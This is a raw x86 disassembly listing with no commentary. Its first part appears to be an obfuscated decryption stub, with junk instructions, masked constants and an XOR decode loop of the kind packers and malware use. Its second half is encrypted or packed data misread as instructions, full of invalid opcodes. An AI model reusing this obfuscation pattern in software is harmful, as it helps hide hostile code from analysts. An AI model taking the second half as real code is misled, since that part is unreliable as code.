  4039af:	lea    ecx,[eax-0x3272f8]
  4039b5:	mov    DWORD PTR [ebp-0x14],ecx
  4039b8:	mov    edx,DWORD PTR [ebp-0x14]
  4039bb:	xor    edx,esi
  4039bd:	add    edx,0x7f55d8fb
  4039c3:	lea    ecx,[ebp+eax*4-0xb4]
  4039ca:	mov    DWORD PTR ds:0x428e59,0x12ce
  4039d4:	mov    DWORD PTR [ecx],edx
  4039d6:	mov    edx,DWORD PTR ds:0x428e95
  4039dc:	mov    edx,DWORD PTR [ecx]
  4039de:	cmp    edx,0x244ecb9a
  4039e4:	mov    DWORD PTR ds:0x428e99,0x3868
  4039ee:	jbe    0x403a09
  4039f4:	add    DWORD PTR ds:0x428ea1,0x428e75
  4039fe:	add    DWORD PTR [ecx],0x405fcdd
  403a04:	jmp    0x403a15
  403a09:	dec    DWORD PTR ds:0x428e99
  403a0f:	add    DWORD PTR [ecx],0xfdaf4323
  403a15:	and    DWORD PTR ds:0x428ea5,0x0
  403a1f:	jmp    0x403a31
  403a24:	mov    ecx,DWORD PTR ds:0x428ea5
  403a2a:	inc    ecx
  403a2b:	mov    DWORD PTR ds:0x428ea5,ecx
  403a31:	cmp    DWORD PTR ds:0x428ea5,0x1a
  403a38:	jae    0x403a68
  403a3e:	cmp    DWORD PTR ds:0x428ea5,0x24
  403a45:	jle    0x403a68
  403a4b:	jmp    0x403a63
  403a50:	push   0x428124
  403a55:	push   DWORD PTR [ebp-0x24]
  403a58:	push   0x8716
  403a5d:	call   DWORD PTR ds:0x42ca60
  403a63:	jmp    0x403a24
  403a68:	mov    ecx,DWORD PTR [ebp-0x18]
  403a6b:	xor    ecx,esi
  403a6d:	adc    DWORD PTR ds:0x428e49,0xcc9
  403a77:	inc    eax
  403a78:	inc    DWORD PTR [ebp-0x14]
  403a7b:	sub    DWORD PTR ds:0x428ed1,0x428e99
  403a85:	add    ecx,edi
  403a87:	cmp    eax,ecx
  403a89:	jb     0x4039b8
  403a8f:	not    DWORD PTR ds:0x428e69
  403a95:	mov    dl,BYTE PTR [ebp-0x21]
  403a98:	add    eax,DWORD PTR ds:0x428e2d
  403a9e:	mov    eax,DWORD PTR [ebp-0x34]
  403aa1:	adc    DWORD PTR ds:0x428e91,0x428e69
  403aab:	xor    al,0xb1
  403aad:	sbb    DWORD PTR ds:0x428e49,0x428e75
  403ab7:	mov    cl,0x8
  403ab9:	sub    cl,al
  403abb:	add    dl,cl
  403abd:	sub    DWORD PTR ds:0x428ea9,ecx
  403ac3:	mov    ecx,DWORD PTR [ebp-0x1c]
  403ac6:	sbb    DWORD PTR ds:0x428ed1,0x428e31
  403ad0:	xor    cl,0xb1
  403ad3:	xor    DWORD PTR ds:0x428ea5,0x741f
  403add:	sub    cl,0x8
  403ae0:	sub    DWORD PTR ds:0x428e39,0x428eb9
  403aea:	ror    dl,cl
  403aec:	xor    eax,eax
  403aee:	mov    eax,ds:0x4292f9
  403af3:	xor    ecx,ecx
  403af5:	add    ecx,DWORD PTR ds:0x429be5
  403afb:	sub    eax,ecx
  403afd:	imul   eax,DWORD PTR [eax+ecx*1]
  403b01:	mov    eax,DWORD PTR [ebp-0xc]
  403b04:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  403b0b:	mov    DWORD PTR ds:0x428e61,0x15
  403b15:	cmp    DWORD PTR ds:0x428e61,0x0
  403b1c:	je     0x403b74
  403b22:	cmp    DWORD PTR ds:0x428e61,0x5
  403b29:	jb     0x403b74
  403b2f:	jmp    0x403b49
  403b34:	push   0x42819a
  403b39:	push   0x0
  403b3b:	push   DWORD PTR [ebp-0x18]
  403b3e:	push   0x1deb
  403b43:	call   DWORD PTR ds:0x42ca64
  403b49:	cmp    DWORD PTR ds:0x428e61,0x6
  403b50:	jne    0x403b61
  403b56:	mov    eax,ds:0x428e61
  403b5b:	dec    eax
  403b5c:	mov    ds:0x428e61,eax
  403b61:	xor    eax,eax
  403b63:	xor    eax,DWORD PTR ds:0x428e61
  403b69:	dec    eax
  403b6a:	mov    ds:0x428e61,eax
  403b6f:	jmp    0x403b15
  403b74:	mov    eax,DWORD PTR [ebp-0xc]
  403b77:	mov    ecx,DWORD PTR [ebp-0x28]
  403b7a:	sub    eax,edi
  403b7c:	xor    eax,esi
  403b7e:	cmp    eax,ecx
  403b80:	jne    0x403baa
  403b86:	mov    eax,DWORD PTR [ebp-0x8]
  403b89:	mov    ecx,DWORD PTR [ebp-0x10]
  403b8c:	xor    eax,esi
  403b8e:	xor    ecx,esi
  403b90:	sub    eax,ecx
  403b92:	sub    eax,edi
  403b94:	xor    eax,esi
  403b96:	mov    DWORD PTR [ebp-0x8],eax
  403b99:	mov    eax,DWORD PTR [ebp-0x10]
  403b9c:	xor    eax,esi
  403b9e:	mov    ecx,0xffcd8d88
  403ba3:	sub    ecx,eax
  403ba5:	jmp    0x403bb9
  403baa:	mov    eax,DWORD PTR [ebp-0x10]
  403bad:	xor    eax,esi
  403baf:	mov    ecx,0xffcd8d08
  403bb4:	sub    ecx,eax
  403bb6:	add    ecx,DWORD PTR [ebp-0xc]
  403bb9:	mov    DWORD PTR [ebp-0xc],ecx
  403bbc:	mov    eax,DWORD PTR [ebp-0x8]
  403bbf:	cmp    eax,0xf89c85b9
  403bc4:	jne    0x4038a1
  403bca:	mov    DWORD PTR [ebp-0x34],0x9
  403bd1:	mov    ecx,DWORD PTR [ebp+0x8]
  403bd4:	xor    ecx,esi
  403bd6:	add    ecx,edi
  403bd8:	jmp    0x4084e6
  403bdd:	lea    eax,[ecx+ebx*1]
  403be0:	mov    DWORD PTR [ebp-0x2c],eax
  403be3:	mov    eax,DWORD PTR [ebp-0x58]
  403be6:	sub    eax,ecx
  403be8:	mov    DWORD PTR [ebp-0x1c],eax
  403beb:	mov    eax,DWORD PTR [ebp-0x1c]
  403bee:	mov    DWORD PTR [ebp-0x14],eax
  403bf1:	mov    eax,DWORD PTR [ebp-0x2c]
  403bf4:	mov    DWORD PTR [ebp-0x38],0xf89c85b9
  403bfb:	mov    DWORD PTR [ebp-0x54],eax
  403bfe:	mov    DWORD PTR [ebp-0x20],0xf89c85b8
  403c05:	mov    eax,DWORD PTR [ebp-0x38]
  403c08:	xor    eax,esi
  403c0a:	add    eax,edi
  403c0c:	mov    DWORD PTR [ebp-0x10],eax
  403c0f:	mov    eax,DWORD PTR [ebp-0x38]
  403c12:	xor    eax,esi
  403c14:	add    eax,edi
  403c16:	mov    DWORD PTR [ebp-0x8],eax
  403c19:	mov    DWORD PTR [ebp-0x2c],0xf89c8599
  403c20:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  403c27:	mov    eax,DWORD PTR [ebp-0x38]
  403c2a:	mov    edx,DWORD PTR [ebp-0x14]
  403c2d:	xor    eax,esi
  403c2f:	add    eax,edi
  403c31:	cmp    edx,eax
  403c33:	je     0x4084da
  403c39:	mov    eax,DWORD PTR [ebp-0x20]
  403c3c:	xor    eax,esi
  403c3e:	mov    edx,0xffcd8d08
  403c43:	sub    edx,eax
  403c45:	add    edx,DWORD PTR [ebp-0x14]
  403c48:	mov    eax,DWORD PTR [ebp-0x20]
  403c4b:	mov    ebx,DWORD PTR [ebp-0x10]
  403c4e:	xor    eax,esi
  403c50:	add    eax,edi
  403c52:	imul   eax,ebx
  403c55:	cmp    eax,edx
  403c57:	ja     0x4084d7
  403c5d:	mov    edx,DWORD PTR [ebp-0x10]
  403c60:	mov    eax,DWORD PTR [ebp-0x14]
  403c63:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c66:	sub    eax,edx
  403c68:	xor    ebx,esi
  403c6a:	xor    edx,edx
  403c6c:	add    ebx,edi
  403c6e:	div    ebx
  403c70:	mov    DWORD PTR [ebp-0x8],eax
  403c73:	mov    eax,DWORD PTR [ebp-0x44]
  403c76:	mov    edx,DWORD PTR [ebp-0x8]
  403c79:	xor    eax,esi
  403c7b:	add    eax,edi
  403c7d:	cmp    edx,eax
  403c7f:	jbe    0x403c8f
  403c85:	mov    eax,DWORD PTR [ebp-0x44]
  403c88:	xor    eax,esi
  403c8a:	add    eax,edi
  403c8c:	mov    DWORD PTR [ebp-0x8],eax
  403c8f:	mov    eax,DWORD PTR [ebp-0x2c]
  403c92:	mov    edx,DWORD PTR [ebp-0x8]
  403c95:	xor    eax,esi
  403c97:	add    eax,edi
  403c99:	imul   eax,edx
  403c9c:	mov    DWORD PTR [ebp-0x8],eax
  403c9f:	mov    eax,DWORD PTR [ebp-0x38]
  403ca2:	mov    edx,DWORD PTR [ebp-0x8]
  403ca5:	xor    eax,esi
  403ca7:	add    eax,edi
  403ca9:	cmp    edx,eax
  403cab:	je     0x4084c0
  403cb1:	mov    eax,DWORD PTR [ebp-0x8]
  403cb4:	mov    DWORD PTR [ebp-0x18],eax
  403cb7:	mov    eax,DWORD PTR [ebp-0x10]
  403cba:	add    eax,DWORD PTR [ebp-0x54]
  403cbd:	mov    DWORD PTR [ebp-0x1c],0xf89c85b9
  403cc4:	mov    DWORD PTR [ebp-0x8],eax
  403cc7:	mov    eax,0xf89c85b8
  403ccc:	mov    DWORD PTR [ebp-0x28],eax
  403ccf:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  403cd6:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  403cdd:	mov    DWORD PTR [ebp-0x30],eax
  403ce0:	mov    eax,DWORD PTR [ebp-0x1c]
  403ce3:	xor    eax,esi
  403ce5:	add    eax,edi
  403ce7:	jmp    0x40847c
  403cec:	mov    DWORD PTR [ebp-0x4c],0xf89c85a2
  403cf3:	mov    DWORD PTR [ebp-0x50],0xf89c85af
  403cfa:	mov    eax,DWORD PTR [ebp-0x30]
  403cfd:	mov    edx,DWORD PTR [ebp-0xc]
  403d00:	xor    eax,esi
  403d02:	add    eax,edi
  403d04:	imul   eax,edx
  403d07:	mov    edx,DWORD PTR [ebp-0x8]
  403d0a:	mov    al,BYTE PTR [eax+edx*1]
  403d0d:	mov    BYTE PTR [ebp-0x1],al
  403d10:	mov    eax,DWORD PTR [ebp-0x30]
  403d13:	mov    edx,DWORD PTR [ebp-0xc]
  403d16:	xor    eax,esi
  403d18:	add    eax,edi
  403d1a:	imul   eax,edx
  403d1d:	mov    edx,DWORD PTR [ebp-0x5c]
  403d20:	xor    edx,esi
  403d22:	add    eax,edx
  403d24:	mov    edx,DWORD PTR [ebp-0x8]
  403d27:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f8]
  403d2f:	mov    edx,DWORD PTR [ebp-0x4c]
  403d32:	xor    edx,esi
  403d34:	lea    eax,[edx+eax*1+0x3272f8]
  403d3b:	movzx  edx,BYTE PTR [ebp-0x1]
  403d3f:	xor    edx,eax
  403d41:	mov    BYTE PTR [ebp-0x1],dl
  403d44:	mov    al,BYTE PTR [ebp-0x1]
  403d47:	mov    edx,DWORD PTR [ebp-0x30]
  403d4a:	mov    ebx,DWORD PTR [ebp-0xc]
  403d4d:	xor    edx,esi
  403d4f:	add    edx,edi
  403d51:	imul   edx,ebx
  403d54:	mov    ebx,DWORD PTR [ebp-0x8]
  403d57:	mov    BYTE PTR [edx+ebx*1],al
  403d5a:	mov    eax,DWORD PTR [ebp-0x30]
  403d5d:	mov    edx,DWORD PTR [ebp-0xc]
  403d60:	xor    eax,esi
  403d62:	add    eax,edi
  403d64:	imul   eax,edx
  403d67:	mov    edx,DWORD PTR [ebp-0x8]
  403d6a:	mov    al,BYTE PTR [eax+edx*1]
  403d6d:	mov    BYTE PTR [ebp-0x1],al
  403d70:	mov    eax,DWORD PTR [ebp-0x30]
  403d73:	jmp    0x4060ca
  403d78:	iret   
  403d79:	xor    ebp,eax
  403d7b:	jne    0x403de2
  403d7d:	jns    0x403dee
  403d7f:	cmp    edx,edi
  403d81:	mov    ecx,0xf51c0752
  403d86:	inc    edx
  403d87:	pop    ds
  403d88:	mov    ch,0x9e
  403d8a:	jnp    0x403e07
  403d8c:	mov    ch,0x9e
  403d8e:	jnp    0x403e0b
  403d90:	push   edx
  403d91:	shl    DWORD PTR [edi+0x47],1
  403d94:	mov    ecx,0xc3d8426d
  403d99:	iret   
  403d9a:	(bad)  
  403d9b:	(bad)  
  403d9d:	jns    0x403dfd
  403d9f:	mov    esi,0xdb1ee946
  403da4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403da5:	sub    ebp,DWORD PTR [ebp-0x7cd32753]
  403dab:	pop    ebx
  403dac:	sahf   
  403dad:	mov    eax,0x446c5e4e
  403db2:	mov    ds:0xd9eb8b9c,eax
  403db7:	add    eax,DWORD PTR [ebx-0x30]
  403dba:	push   es
  403dbb:	jnp    0x403d71
  403dbd:	hlt    
  403dbe:	sbb    eax,0x87c30aa
  403dc3:	sub    DWORD PTR [ebp-0x5b5fa08b],0x66
  403dca:	push   0xfb74bf53
  403dcf:	cs nop
  403dd1:	jae    0x403d5b
  403dd3:	stos   DWORD PTR es:[edi],eax
  403dd4:	or     eax,0xf5ff6b71
  403dd9:	adc    eax,0x7a2341cb
  403dde:	dec    ebp
  403ddf:	or     edi,DWORD PTR ds:0x8f598afe
  403de5:	repnz (bad) 
  403de7:	repnz add dl,BYTE PTR [eax+0x4a04da95]
  403dee:	cs ds push esi
  403df1:	in     eax,dx
  403df2:	push   esi
  403df3:	cmp    cl,BYTE PTR [ebx+eiz*2-0x5c515860]
  403dfa:	push   cs
  403dfb:	popa   
  403dfc:	lock add ah,dl
  403dff:	lahf   
  403e00:	jle    0x403d9f
  403e02:	jp     0x403e1e
  403e04:	and    BYTE PTR [ecx+0x1592933c],bl
  403e0a:	stos   BYTE PTR es:[edi],al
  403e0b:	(bad)
  403e0e:	jae    0x403e4c
  403e10:	rol    bl,cl
  403e12:	dec    esp
  403e13:	adc    eax,0x34b0d11d
  403e18:	jecxz  0x403e23
  403e1a:	pop    eax
  403e1b:	sbb    BYTE PTR [ebx+0x7acff3d8],bl
  403e21:	xchg   esi,eax
  403e22:	push   ss
  403e23:	sub    BYTE PTR [ebp+0x2ecf3cdf],ch
  403e29:	adc    DWORD PTR [eax+0x89f0074],edx
  403e2f:	adc    eax,DWORD PTR [esi+eax*8-0x39]
  403e33:	icebp  
  403e34:	pop    ebp
  403e35:	xchg   ebp,eax
  403e36:	clc    
  403e37:	es mov edx,0x392afe27
  403e3d:	cmp    ecx,esi
  403e3f:	or     eax,0xbc4cdcba
  403e44:	mov    BYTE PTR [edx],ch
  403e46:	push   es
  403e47:	(bad)  
  403e48:	jb     0x403e58
  403e4a:	dec    edi
  403e4b:	sub    dh,bl
  403e4d:	pop    esi
  403e4e:	pusha  
  403e4f:	and    cl,BYTE PTR [ecx+ebx*4+0x3b]
  403e53:	or     ch,BYTE PTR [bp+0x4c58]
  403e58:	xor    DWORD PTR [ecx-0x6d],ebx
  403e5b:	mov    dl,0x84
  403e5d:	out    dx,eax
  403e5e:	push   ebp
  403e5f:	iret   
  403e60:	sti    
  403e61:	jg     0x403eaf
  403e63:	mov    edx,0x1b027cdc
  403e68:	rol    DWORD PTR [ebx-0x530aa468],0x90
  403e6f:	cmp    eax,0x236ded64
  403e74:	aas    
  403e75:	mov    ebx,0xb87be2b0
  403e7a:	dec    esp
  403e7b:	mov    eax,ds:0xd86aa070
  403e80:	or     DWORD PTR [edi+0xa],ebx
  403e83:	and    BYTE PTR [edi-0x29],ah
  403e86:	pop    ebp
  403e87:	push   0x4a
  403e89:	and    al,0xc4
  403e8b:	xor    al,0xd5
  403e8d:	mov    ecx,esi
  403e8f:	(bad)  
  403e90:	stc    
  403e91:	rcl    bl,0xfb
  403e94:	mov    ebp,0xb89f2a8d
  403e99:	shl    DWORD PTR [ebx+esi*1],0x7b
  403e9d:	add    eax,0xf7b426ff
  403ea2:	jo     0x403e86
  403ea4:	dec    eax
  403ea5:	je     0x403ea5
  403ea7:	cmp    edx,DWORD PTR [eax+eax*2-0x1d]
  403eab:	std    
  403eac:	and    ecx,esp
  403eae:	ss mov edx,0x53fb554f
  403eb4:	and    DWORD PTR [edx+edi*1],esi
  403eb7:	dec    edi
  403eb8:	add    eax,0x40c71255
  403ebd:	fisttp WORD PTR [ecx-0x5d]
  403ec0:	adc    ax,WORD PTR [ebx+0x3f64a8b6]
  403ec7:	(bad)  
  403ec9:	div    DWORD PTR ds:[edi]
  403ecc:	ficom  DWORD PTR [edx+0x4f]
  403ecf:	fistp  WORD PTR [edx+esi*4-0x6e]
  403ed3:	jl     0x403f1b
  403ed5:	jae    0x403e6f
  403ed7:	xchg   ecx,eax
  403ed8:	inc    esi
  403ed9:	aas    
  403eda:	add    edi,DWORD PTR [edi+0x17]
  403edd:	data16 jo 0x403ebe
  403ee0:	inc    ebx
  403ee1:	add    DWORD PTR [edx+0x45118c4f],esp
  403ee7:	addr16 mov ch,0x7
  403eea:	sbb    al,dh
  403eec:	mov    ebx,0x19c4b092
  403ef1:	pop    ebx
  403ef2:	in     al,dx
  403ef3:	dec    esp
  403ef4:	push   0x3cd1f7e8
  403ef9:	adc    eax,0x31ebd130
  403efe:	mov    al,ds:0x77e2f859
  403f03:	cmp    ecx,edx
  403f05:	fbstp  TBYTE PTR [esi]
  403f07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f08:	cmp    ch,BYTE PTR [ecx+0x48]
  403f0b:	cmp    cl,al
  403f0d:	add    al,0x6d
  403f0f:	inc    ebp
  403f10:	jp     0x403f3c
  403f12:	(bad)  
  403f13:	call   0x6895:0xefa6ad0b
  403f1a:	sub    DWORD PTR [esi+0x19451ffa],ecx
  403f20:	fisubr WORD PTR [esi-0x3d100db]
  403f26:	fdiv   DWORD PTR [esi-0x65]
  403f29:	inc    edx
  403f2a:	arpl   WORD PTR [ecx+0x1b],ax
  403f2d:	cmp    al,0x29
  403f2f:	jb     0x403f7d
  403f31:	int3   
  403f32:	cmp    BYTE PTR [edx+ebx*8],bl
  403f35:	and    eax,0xcd5dda03
  403f3a:	inc    ecx
  403f3b:	enter  0x9fe8,0xff
  403f3f:	fdiv   QWORD PTR [edi+0x3a]
  403f42:	jg     0x403f91
  403f44:	ja     0x403efa
  403f46:	mov    ebp,0x3477cc0d
  403f4b:	push   ss
  403f4c:	dec    ecx
  403f4d:	in     al,0xe3
  403f4f:	mov    BYTE PTR fs:[ebp+0x19b648ee],dh
  403f56:	push   esi
  403f57:	xor    BYTE PTR [eax-0x14],0x1f
  403f5b:	xchg   ecx,eax
  403f5c:	stos   BYTE PTR es:[edi],al
  403f5d:	mov    esp,0xe6f0e098
  403f62:	push   es
  403f63:	xlat   BYTE PTR ds:[ebx]
  403f64:	xchg   esi,eax
  403f65:	test   BYTE PTR [esi+0x42c3aef6],dh
  403f6b:	pop    ebx
  403f6c:	pop    esi
  403f6d:	jle    0x403fe1
  403f6f:	icebp  
  403f70:	jmp    0x403eff
  403f72:	pop    eax
  403f73:	fist   DWORD PTR [eax+esi*2]
  403f76:	or     ch,bh
  403f78:	mov    ds:0x84ef406c,al
  403f7d:	mov    ecx,0xe78ce440
  403f82:	aam    0x3a
  403f84:	adc    bh,bh
  403f86:	sbb    dh,bl
  403f88:	out    dx,eax
  403f89:	mov    ebx,0x3505302a
  403f8e:	dec    esp
  403f8f:	in     eax,0xe7
  403f91:	enter  0x3549,0x44
  403f95:	scas   eax,DWORD PTR es:[edi]
  403f96:	cmp    esi,DWORD PTR ds:[ebx-0x72]
  403f9a:	lods   eax,DWORD PTR ds:[esi]
  403f9b:	scas   eax,DWORD PTR es:[edi]
  403f9c:	inc    ecx
  403f9d:	xchg   BYTE PTR [esi+0x560ea363],al
  403fa3:	aad    0x9b
  403fa5:	sub    eax,0x669809c4
  403faa:	jae    0x403fc7
  403fac:	push   eax
  403fad:	sub    bh,BYTE PTR [edx-0x5c5b838f]
  403fb3:	(bad)  
  403fb4:	adc    edx,DWORD PTR fs:[esp+ecx*8+0x3d]
  403fb9:	mov    ebx,0xdc7f9275
  403fbe:	dec    ebp
  403fbf:	jo     0x403f93
  403fc1:	push   esi
  403fc2:	leave  
  403fc3:	aad    0x37
  403fc5:	cld    
  403fc6:	lock sbb al,0x9e
  403fc9:	mov    eax,ds:0xd4d3c1cf
  403fce:	jno    0x403fbd
  403fd0:	or     al,0x51
  403fd2:	imul   BYTE PTR [edx-0x3a7442d0]
  403fd8:	leave  
  403fd9:	add    eax,0xfd044ffe
  403fde:	(bad)  
  403fdf:	aad    0x3e
  403fe1:	push   cs
  403fe2:	mov    bh,0x90
  403fe4:	leave  
  403fe5:	lds    esp,FWORD PTR [eax-0x639be776]
  403feb:	mov    ebx,0xe9802cd1
  403ff0:	sub    eax,0x5adeda12
  403ff5:	inc    edx
  403ff6:	inc    ebx
  403ff7:	in     eax,dx
  403ff8:	(bad)  
  403ffa:	sbb    al,0x20
  403ffc:	jbe    0x403fe7
  403ffe:	pop    esi
  403fff:	xchg   edx,eax
  404000:	clc    
  404001:	fmul   QWORD PTR [esi+edx*8-0x4a]
  404005:	aam    0xe0
  404007:	jno    0x403ff7
  404009:	xor    bh,dh
  40400b:	xchg   edx,eax
  40400c:	inc    ebp
  40400d:	imul   edx,DWORD PTR [ecx+0x2413e7d5],0x3e293dad
  404017:	push   ss
  404018:	xor    ebx,DWORD PTR [ebx-0x2]
  40401b:	cmc    
  40401c:	shl    esi,1
  40401e:	pop    esp
  40401f:	bound  ecx,QWORD PTR [eax]
  404021:	sub    eax,0x9cfcb4f9
  404026:	scas   eax,DWORD PTR es:[edi]
  404027:	and    eax,eax
  404029:	pop    ebx
  40402a:	lods   eax,DWORD PTR ds:[esi]
  40402b:	adc    ah,BYTE PTR [ebx-0x1e673168]
  404031:	sub    eax,0xd5e8637
  404036:	mov    ds:0xe19d6d5e,eax
  40403b:	ret    0xaa1f
  40403e:	test   DWORD PTR [edx+0x47],esi
  404041:	sbb    ebp,DWORD PTR [edx+0x42dd5727]
  404047:	add    ecx,DWORD PTR [edx+ebx*8+0x2e]
  40404b:	test   BYTE PTR [eax+ecx*2-0xcbaca4a],dh
  404052:	inc    esp
  404053:	rcl    BYTE PTR [ecx],1
  404055:	adc    eax,0xbd8abf06
  40405a:	bound  edi,QWORD PTR [ebp-0x7b]
  40405d:	addr16 div ch
  404060:	ins    BYTE PTR es:[edi],dx
  404061:	pop    es
  404062:	push   0xfffffff9
  404064:	adc    eax,0x358b583f
  404069:	imul   edi,DWORD PTR [esi-0x5a205406],0x6d06eff7
  404073:	js     0x40406e
  404075:	and    esp,DWORD PTR [edx-0x24]
  404078:	or     ah,dh
  40407a:	js     0x4040de
  40407c:	mov    bl,BYTE PTR [esi]
  40407e:	rcl    BYTE PTR [ebx-0x4285066e],cl
  404084:	pop    ebp
  404085:	pop    esi
  404086:	pop    ds
  404087:	cwde   
  404088:	xchg   esp,ebp
  40408a:	jmp    0x6f72daa8
  40408f:	xlat   BYTE PTR ds:[ebx]
  404090:	push   ss
  404091:	inc    esp
  404092:	ds cmc 
  404094:	aaa    
  404095:	aad    0x6e
  404097:	cmp    BYTE PTR [ebx+edi*2+0x2c],0xf3
  40409c:	(bad)  
  40409d:	push   cs
  40409e:	pop    eax
  40409f:	repnz xchg ebx,eax
  4040a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040a2:	mov    dl,0x34
  4040a4:	mov    esi,0x14ea0993
  4040a9:	and    eax,0xc5f45d71
  4040ae:	loopne 0x40412a
  4040b0:	mov    ds:0xe23b712,al
  4040b5:	mov    esi,0x8e0eb53
  4040ba:	adc    edx,DWORD PTR [eax-0x76]
  4040bd:	aam    0xf0
  4040bf:	cmp    ch,BYTE PTR [edx-0x790a445f]
  4040c5:	stos   BYTE PTR es:[edi],al
  4040c6:	ss add al,0x39
  4040c9:	push   0x28
  4040cb:	loopne 0x4040c4
  4040cd:	mov    edx,0xfca1de88
  4040d2:	mov    al,0x26
  4040d4:	mov    BYTE PTR [ecx+0x20],cl
  4040d7:	mov    BYTE PTR [ebx+0x28],dh
  4040da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040db:	mov    al,0xe
  4040dd:	pop    es
  4040de:	in     al,0x7f
  4040e0:	stos   BYTE PTR es:[edi],al
  4040e1:	pop    ebx
  4040e2:	stos   DWORD PTR es:[edi],eax
  4040e3:	lods   eax,DWORD PTR ds:[esi]
  4040e4:	xor    BYTE PTR es:[esi+0x19a42cfd],al
  4040eb:	xor    edi,DWORD PTR [edx+0x36d3db7d]
  4040f1:	mov    ah,0x48
  4040f3:	enter  0xad1a,0x6c
  4040f7:	ins    BYTE PTR es:[edi],dx
  4040f8:	push   esi
  4040f9:	mov    edi,0x5c0c0907
  4040fe:	repz retf 
  404100:	ss jl  0x4040e9
  404103:	icebp  
  404104:	pop    ecx
  404105:	iret   
  404106:	sti    
  404107:	pop    esi
  404108:	out    0x5d,eax
  40410a:	pop    edi
  40410b:	xchg   esp,eax
  40410c:	sub    DWORD PTR [edi-0x6b],edi
  40410f:	sub    DWORD PTR [esi-0x32],esp
  404112:	dec    ebx
  404113:	cmp    cl,BYTE PTR [eax+0x2036ae45]
  404119:	popa   
  40411a:	cmp    DWORD PTR [ebx],esi
  40411c:	push   ss
  40411d:	out    0x38,eax
  40411f:	aad    0x11
  404121:	xchg   edi,eax
  404122:	test   al,0x8f
  404124:	dec    ebx
  404125:	out    0x74,eax
  404127:	mov    es,WORD PTR [edx+0x40408aca]
  40412d:	div    BYTE PTR [ecx]
  40412f:	xchg   edi,eax
  404130:	cdq    
  404131:	rcl    BYTE PTR [edi],1
  404133:	or     BYTE PTR [edi+0x1],0x29
  404137:	mov    ebp,0x847af089
  40413c:	je     0x404187
  40413e:	sahf   
  40413f:	mov    ds:0x95c02c67,al
  404144:	scas   eax,DWORD PTR es:[edi]
  404145:	imul   ebp,DWORD PTR [ecx+0x13a1c214],0x32
  40414c:	inc    esi
  40414d:	lods   eax,DWORD PTR ds:[esi]
  40414e:	mov    edi,0x7a5bebb3
  404153:	dec    edi
  404154:	(bad)  
  404156:	std    
  404157:	ret    
  404158:	sbb    cl,BYTE PTR [eax+ebx*2+0x66]
  40415c:	mov    bl,0x88
  40415e:	js     0x404172
  404160:	pusha  
  404161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404162:	mov    al,ds:0xb6b958bf
  404167:	xor    ch,BYTE PTR [edx+ecx*2-0x54]
  40416b:	je     0x404191
  40416d:	mov    dl,0x89
  40416f:	and    bl,bh
  404171:	cmp    esp,DWORD PTR [edx-0xdb29bab]
  404177:	mov    al,0x3e
  404179:	out    0xc2,eax
  40417b:	lods   al,BYTE PTR ds:[esi]
  40417c:	jo     0x40419b
  40417e:	push   es
  40417f:	push   ss
  404180:	push   esp
  404181:	sti    
  404182:	pusha  
  404183:	sub    ch,BYTE PTR [ebp+0xd]
  404186:	mov    edi,0x47772e42
  40418b:	mov    ecx,0x1de92fa1
  404190:	(bad)  
  404191:	lds    ebp,FWORD PTR [edi-0x28]
  404194:	jnp    0x4041ed
  404196:	cwde   
  404197:	jbe    0x4041f6
  404199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40419a:	ins    DWORD PTR es:[edi],dx
  40419b:	mov    dl,0x30
  40419d:	cmp    al,0x5c
  40419f:	push   ds
  4041a0:	retf   0x5c46
  4041a3:	fsubr  st(0),st
  4041a5:	es push edi
  4041a7:	jns    0x4041be
  4041a9:	mov    BYTE PTR [ebx+0x7d],bl
  4041ac:	mov    edx,0x75b09a4a
  4041b1:	or     BYTE PTR [ebx+edx*2+0x5575a8b3],al
  4041b8:	sub    al,0xf1
  4041ba:	add    al,0x85
  4041bc:	lods   eax,DWORD PTR ds:[esi]
  4041bd:	pop    es
  4041be:	pop    ebp
  4041bf:	sbb    dl,BYTE PTR [edi+0x5a]
  4041c2:	add    esp,ebp
  4041c4:	cdq    
  4041c5:	mov    eax,0x5b66f3fc
  4041ca:	lahf   
  4041cb:	xor    BYTE PTR [ecx-0x6cc24a],0x33
  4041d2:	mov    cl,0x2b
  4041d4:	cmp    dh,BYTE PTR [ecx+0x1d]
  4041d7:	clc    
  4041d8:	jmp    0x4041ae
  4041da:	jnp    0x404245
  4041dc:	stc    
  4041dd:	inc    edx
  4041de:	dec    ebx
  4041df:	retf   0x5953
  4041e2:	mov    esp,0xf965e3d2
  4041e7:	clc    
  4041e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041e9:	pop    ds
  4041ea:	into   
  4041eb:	sbb    al,0x23
  4041ed:	out    0x41,eax
  4041ef:	retf   
  4041f0:	loop   0x404195
  4041f2:	fdiv   DWORD PTR [eax+0x715e750b]
  4041f8:	aad    0x6b
  4041fa:	(bad)  
  4041fb:	xor    al,0x75
  4041fd:	xchg   BYTE PTR [ecx],bl
  4041ff:	or     eax,0xdd132d56
  404204:	inc    esp
  404205:	push   ebp
  404206:	into   
  404207:	(bad)  
  404208:	lock cmp al,0xf0
  40420b:	test   eax,0x59ef8e2f
  404210:	or     bh,BYTE PTR [eax-0x2b9b2bc5]
  404216:	push   edi
  404217:	pop    ss
  404218:	jecxz  0x404213
  40421a:	mov    dh,0x9e
  40421c:	mov    DWORD PTR [eax+eax*4+0x5c],ecx
  404220:	sub    esp,DWORD PTR [ebx+0x63]
  404223:	lea    ebp,gs:[ecx+0x6402a738]
  40422a:	add    dl,BYTE PTR [ebx+0x49]
  40422d:	jmp    0xff020340
  404232:	mov    bl,0x53
  404234:	cdq    
  404235:	jmp    0xa5f3:0xcbf0c0c1
  40423c:	cmp    al,0x96
  40423e:	sub    al,0xd0
  404240:	in     eax,dx
  404241:	in     eax,0x8c
  404243:	xlat   BYTE PTR ds:[ebx]
  404244:	fwait
  404245:	dec    eax
  404246:	sbb    eax,0xb71d5a35
  40424b:	mov    dh,0x9d
  40424d:	xor    esp,ecx
